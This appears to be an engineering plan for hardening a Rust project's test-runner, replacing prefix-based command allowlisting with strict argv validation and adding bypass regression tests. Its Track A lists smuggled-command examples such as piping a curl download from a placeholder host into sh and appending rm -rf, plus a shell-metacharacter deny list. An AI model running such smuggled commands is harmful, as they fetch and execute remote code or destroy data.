# Supervised Test Subsystem Tightening Pass Plan

## Context

The supervised test subsystem has landed and received one hardening pass. The follow-up hardening commit addressed several important concerns:

```text
- Unix process-group cleanup for timeout paths
- shared custom command allowlist in `src/test_runner/custom.rs`
- ANSI escape stripping before parser matching
- stale `/test` completion protection through request tracking
- documentation updates for the test runner and tool counts
```

The remaining concern is closure quality. The current subsystem is close, but custom-command validation still appears to use prefix matching. Prefix matching is not sufficient for a security-sensitive shell-execution boundary because an allowed command prefix can be followed by shell control operators, command substitution, newlines, or other suffix-smuggling patterns.

This tightening pass should close the remaining validation/security gap, add regression tests for the exact bypass classes, and confirm that process/event/TUI behavior is still clean after the hardening changes.

## Primary objective

Make the minimal supervised test subsystem safe and stable enough to treat as closed for the current milestone.

The pass should end with:

```text
- strict custom command validation
- shared validation across model-facing `test` tool and `/test custom`
- regression coverage for shell metacharacter/suffix smuggling
- targeted runner/tool/TUI tests passing
- docs updated to describe the exact validation boundary
- no expansion into RTK memory, impact analysis, or detached agent jobs
```

## Non-goals

Do not add:

```text
- RTK-backed test history
- previous-failures report index
- changed-file impact analysis
- coverage-aware selection
- nextest/JUnit/pytest structured output adapters
- automatic rerouting from bash to test
- fully detached daemon-managed test jobs
- automatic agent resumption after test completion
```

Those are follow-up feature tracks. This pass is a closure pass for the current minimal subsystem.

## Track A: Replace prefix-only custom command validation

### Problem

`src/test_runner/custom.rs` currently exposes a shared allowlist for commands like:

```text
cargo test
cargo nextest
pytest
uv run pytest
go test
make test
```

The validation shape appears to accept commands if the trimmed string starts with an allowlisted prefix. That admits unsafe ambiguity. Examples that must not pass:

```text
cargo test; rm -rf target/tmp
cargo test && curl example.invalid/script | sh
cargo test || echo bypass
pytest | tee /tmp/out
pytest $(some-command)
pytest `some-command`
cargo test
rm -rf target/tmp
cargo test > /tmp/out
cargo test 2>&1 | sh
```

Even if the tool remains `ShellExec`, this subsystem should not become a generic shell launcher. Custom scope should mean “allowlisted test command with ordinary arguments,” not arbitrary shell syntax after an allowlisted prefix.

### Implementation direction

Replace `starts_with` validation with one of these approaches.

Preferred approach: shell-words parse plus metacharacter rejection.

```text
1. Reject input containing forbidden shell control characters before parsing.
2. Parse into argv with a shell-word parser only if an existing dependency already exists or a minimal parser is acceptable.
3. Match argv prefix against allowlisted argv prefixes, not raw strings.
4. Permit only normal argument tokens after the matched prefix.
```

If adding a shell-word parser dependency is not desirable, implement a conservative local tokenizer:

```text
- split on ASCII whitespace
- reject quotes initially unless explicitly supported
- reject empty tokens
- reject all shell metacharacters and control operators
- compare token prefix against allowlisted token arrays
```

For test commands, conservative is acceptable. Rejecting complex shell syntax is the intended behavior.

### Forbidden input patterns

Reject commands containing any of these unless a future parser proves safe handling:

```text
;
&&
||
|
>
<
` 
$(
${
\n
\r
\0
&
```

Also reject suspicious Unicode/control characters:

```text
ASCII control chars except ordinary spaces/tabs
non-printable bidirectional controls
```

If Unicode handling is already centralized elsewhere, reuse it. Otherwise, add a small local check.

### Allowlist representation

Change the allowlist from raw command strings to structured prefixes:

```rust
pub struct AllowedTestCommand {
    pub label: &'static str,
    pub argv_prefix: &'static [&'static str],
}
```

Example:

```rust
AllowedTestCommand { label: "cargo test", argv_prefix: &["cargo", "test"] }
AllowedTestCommand { label: "cargo nextest", argv_prefix: &["cargo", "nextest"] }
AllowedTestCommand { label: "uv run pytest", argv_prefix: &["uv", "run", "pytest"] }
```

Then validation becomes:

```text
- tokenize command
- find an allowlisted argv_prefix that matches the beginning of token list exactly
- require token list length >= prefix length
- return a normalized argv vector or validation result
```

### API shape

Replace or supplement `is_allowed_custom_command(cmd: &str) -> bool` with a richer API:

```rust
pub struct ValidatedCustomCommand {
    pub argv: Vec<String>,
    pub label: &'static str,
}

pub enum CustomCommandValidationError {
    Empty,
    ForbiddenShellSyntax,
    UnsupportedCommand,
    InvalidToken,
}

pub fn validate_custom_command(cmd: &str) -> Result<ValidatedCustomCommand, CustomCommandValidationError>
```

Keep `is_allowed_custom_command` only as a test/helper wrapper if needed:

```rust
pub fn is_allowed_custom_command(cmd: &str) -> bool {
    validate_custom_command(cmd).is_ok()
}
```

### Acceptance criteria

```text
- Raw prefix matching is removed from security-sensitive validation.
- TUI and model-facing tool use `validate_custom_command` from one shared module.
- Allowed commands with normal arguments pass.
- Shell control operators, redirection, pipes, command substitution, newlines, and suffix-smuggling cases fail.
- Error messages are clear but do not suggest shell bypasses.
```

## Track B: Reuse validated argv instead of reparsing where possible

### Rationale

If `validate_custom_command` produces an argv vector, the runner should preferably execute that argv vector rather than round-tripping through a raw shell string. This removes another class of shell interpretation risk.

### Tasks

Inspect the custom-scope flow:

```text
src/tool/test.rs
src/tui/commands/test.rs
src/test_runner/resolve.rs
src/test_runner/runner.rs
```

Current design may store `TestScope::CustomCommand(String)` and resolve it into a command. Tighten this by either:

```text
Option A: Change custom scope to carry a validated argv structure.
Option B: Keep TestScope::CustomCommand(String) but validate at boundary and have resolver tokenize into argv using the same validator.
```

Option A is cleaner but may require more type churn. Option B is acceptable if the validator is the only path that turns raw custom text into argv.

### Specific rule

For `custom`, do not execute through a shell unless there is an explicit, audited reason. Prefer direct `Command::new(argv[0]).args(&argv[1..])` execution, consistent with the generated command path.

### Acceptance criteria

```text
- Custom command execution path is argv-based.
- No custom command path invokes a shell parser after validation.
- Generated commands and validated custom commands share runner execution behavior.
```

## Track C: Add regression tests for custom-command bypasses

### Tests in `src/test_runner/custom.rs`

Add tests:

```text
custom_allows_cargo_test_with_normal_args
custom_allows_pytest_with_normal_args
custom_allows_uv_run_pytest_with_normal_args
custom_rejects_semicolon_suffix
custom_rejects_and_and_suffix
custom_rejects_or_or_suffix
custom_rejects_pipe_suffix
custom_rejects_redirection_suffix
custom_rejects_command_substitution_dollar_paren
custom_rejects_backtick_substitution
custom_rejects_newline_second_command
custom_rejects_background_operator
custom_rejects_leading_disallowed_command
custom_rejects_prefix_collision_cargo_testify
custom_rejects_prefix_collision_pytestevil
custom_rejects_empty_or_whitespace
```

Prefix-collision examples are important:

```text
cargo testify
pytestevil
make testcase
```

These should not pass merely because they start with allowed text.

### Tests in model-facing tool

Add tests in `src/tool/test.rs` or existing test module:

```text
test_tool_custom_rejects_semicolon_suffix
test_tool_custom_rejects_pipe_suffix
test_tool_custom_rejects_command_substitution
test_tool_custom_accepts_normal_cargo_test_args
```

These should validate the tool boundary, not execute dangerous commands.

### Tests in TUI command parser

Add tests in `src/tui/commands/test.rs`:

```text
tui_test_custom_rejects_semicolon_suffix
tui_test_custom_rejects_newline_suffix
tui_test_custom_rejects_pipe_suffix
tui_test_custom_accepts_normal_pytest_args
```

### Acceptance criteria

```text
- Bypass regression tests exist at shared validator, tool, and TUI boundaries.
- Tests fail under old prefix-only validation and pass under tightened validation.
```

## Track D: Confirm process-group hardening behavior remains portable

### Tasks

Review the Unix process-group implementation in `src/test_runner/runner.rs`.

Confirm:

```text
- `nix` dependency is target-gated under cfg(unix)
- non-Unix builds do not reference nix-only symbols
- Unix child setup calls setsid or equivalent before exec
- timeout cleanup kills process group with negative pgid
- fallback child.kill path still exists if process group kill fails
- cleanup wait is bounded
```

Add tests or compile guards:

```text
unix_process_group_helpers_are_cfg_unix
non_unix_fallback_compiles_if CI supports it
runner_timeout_path_still_returns_report_after_kill
```

If cross-platform CI is unavailable, document the non-Unix fallback in `architecture/test_runner.md`.

### Acceptance criteria

```text
- Unix process-group code is cfg-isolated.
- Timeout cleanup has a fallback path.
- Docs accurately state Unix process-group support and non-Unix fallback behavior.
```

## Track E: Verify stale `/test` completion protection

### Rationale

The hardening commit added stale completion protection through request ID tracking. This is a good fix, but it needs narrow tests because stale async UI completions are easy to regress.

### Tasks

Inspect changes in:

```text
src/tui/app/mod.rs
src/tui/app/state/dialog.rs
src/tui/runtime/command_dispatch.rs
```

Add or improve tests if the TUI state layer supports them:

```text
stale_test_run_finished_is_ignored
current_test_run_finished_updates_ui
starting_new_test_run_replaces_pending_request_id
non_test_async_request_state_unaffected
```

If direct TUI tests are not feasible, isolate the request-id logic into a small state helper and unit-test that helper.

### Acceptance criteria

```text
- Stale completion protection is covered by tests or a small extracted helper.
- `/test` completion cannot overwrite state from a newer `/test` invocation.
- Existing async UI request behavior is not broken.
```

## Track F: Parser/report final polish

### ANSI stripping review

The parser now strips ANSI escape sequences. Confirm the implementation handles at least basic CSI color codes:

```text
\x1b[31mFAILED\x1b[0m
\x1b[1;32mok\x1b[0m
```

Add tests:

```text
parser_strips_ansi_for_rust_failed_line
parser_strips_ansi_for_pytest_failed_line
parser_strips_ansi_for_compile_error_line
```

If the current stripper only handles alphabetic terminators, that is acceptable for common CSI color codes. Do not overbuild an ANSI parser unless tests prove it necessary.

### Report closure checks

Confirm reports remain bounded after the tightening changes:

```text
- custom validation errors are short
- failure reports still limit primary failures
- timeout reports still include log paths
- no raw full output is emitted into AppEvent progress
```

### Acceptance criteria

```text
- ANSI-colored common Rust/pytest output is parsed correctly.
- Report bounds remain intact.
- Event progress remains compact.
```

## Track G: Documentation update

Update:

```text
architecture/test_runner.md
architecture/tool.md
architecture/command.md
README.md if user-facing command behavior is documented there
```

Docs should state:

```text
- custom commands are validated as allowlisted argv prefixes, not arbitrary shell strings
- shell metacharacters/control operators are rejected in custom scope
- `/test custom` and model-facing custom scope share the same validator
- generated test commands are direct argv execution
- Unix timeout cleanup kills the process group; non-Unix falls back to child kill
```

Do not claim cross-platform process-tree cleanup unless implemented.

### Acceptance criteria

```text
- Docs match actual validation semantics.
- Known limitations are explicit.
- No stale statement says prefix-only validation is sufficient.
```

## Track H: Final targeted validation

Run:

```text
cargo fmt --check
cargo check
cargo test -p codegg --lib test_runner
cargo test -p codegg --lib tool::test
cargo test -p codegg --lib tui::commands::test
```

If time/resources permit, also run:

```text
cargo test -p codegg --lib test_runner::custom
cargo test -p codegg --lib test_runner::runner::tests
```

If exact module target names differ, adjust to the repo's actual test paths.

### Acceptance criteria

```text
- format check passes
- compile check passes
- shared custom validator tests pass
- tool boundary tests pass
- TUI command parser tests pass
- runner tests still pass after custom argv changes
```

## Recommended implementation order

1. Replace raw prefix validation with strict shared validator.
2. Add shared validator bypass regression tests.
3. Wire tool and TUI custom paths through the strict validator.
4. Confirm custom execution is argv-based and not shell-reparsed.
5. Add stale request-id tests or isolate/test the helper.
6. Add ANSI parser regression tests if missing.
7. Update docs for exact validation semantics.
8. Run final targeted validation.

## Final closure checklist

The supervised test subsystem can be considered closed for the minimal milestone when:

```text
- custom command validation rejects shell operators, command substitution, redirection, pipes, newlines, and prefix collisions
- tool and TUI use the same shared validator
- custom execution does not use shell interpretation after validation
- Unix process-group cleanup remains cfg-gated and documented
- stale `/test` completions are protected and tested
- ANSI-colored common test output is parsed
- model-facing reports remain bounded
- event progress remains compact and non-raw
- targeted validation commands pass
```

## Expected next work after this pass

After this pass, the supervised test subsystem should stop receiving hardening churn unless a concrete bug appears. The next feature plan should be selected deliberately from:

```text
- previous_failures report index and rerun support
- CoreEvent/protocol mapping for remote daemon/frontends
- RTK/context artifact integration for test history and logs
- optional structured output adapters for nextest/JUnit/pytest
```
